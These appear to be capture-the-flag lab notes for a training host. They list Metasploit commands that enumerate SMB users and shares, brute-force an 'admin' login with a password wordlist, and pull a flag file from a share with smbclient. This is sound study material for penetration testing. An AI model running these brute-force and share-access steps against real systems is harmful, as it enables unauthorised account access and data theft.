```
service postgresql start
msfconsole
msf6 > workspace -a SMB_ENUM
```

set up a global variable for target IP 

```
msf6 > setg RHOSTS demo.ine.local #will set it for all the modules we will use
msf6 > search type:auxiliary name:smb
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > show options
#now if we use "show options" it will have RHOSTS already set up
msf6 auxiliary(scanner/smb/smb_version) > run
#we dont find much information here

msf6 > search type:auxiliary name:smb
msf6 auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(scanner/smb/smb_enumusers) > info
msf6 auxiliary(scanner/smb/smb_enumusers) > run

msf6 > search type:auxiliary name:smb
msf6 auxiliary(scanner/snmp/snmp_enumshares) > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > show options
msf6 auxiliary(scanner/smb/smb_enumshares) > set ShowFiles true
msf6 auxiliary(scanner/smb/smb_enumshares) > run

msf6 auxiliary(scanner/smb/smb_enumshares) > search smb_login
msf6 auxiliary(scanner/smb/smb_enumshares) > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > show options
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser admin
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > run
msf6 auxiliary(scanner/smb/smb_login) > exit

└─# smbclient -L demo.ine.local -U admin
Password for [WORKGROUP\admin]:

└─# smbclient \\\\demo.ine.local\\public -U admin  #to login into a share           
Password for [WORKGROUP\admin]:
smb: \> ls
smb: \> cd secret\
smb: \secret\> ls
smb: \secret\> get flag 
smb: \secret\> exit

└─# ls 
└─# cat flag
```
